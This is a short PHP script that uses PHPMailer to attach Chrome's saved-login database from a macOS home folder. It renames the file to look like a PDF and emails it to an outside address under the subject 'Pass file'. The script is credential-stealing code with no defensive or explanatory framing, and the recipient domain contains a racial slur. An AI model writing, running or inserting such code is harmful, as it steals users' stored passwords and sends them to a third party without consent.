<?php
$email = new PHPMailer();
$email->From      = 'olari@gmail.com';
$email->FromName  = 'olari';
$email->Subject   = 'Pass file';
$email->Body      = $bodytext;
$email->AddAddress( 'nistinipa@nigge.rs' );

$file_to_attach = '~/Library/Application Support/Google/Chrome/Default/Login\ Data';

$email->AddAttachment( $file_to_attach , 'NameOfFile.pdf' );

return $email->Send();
?>
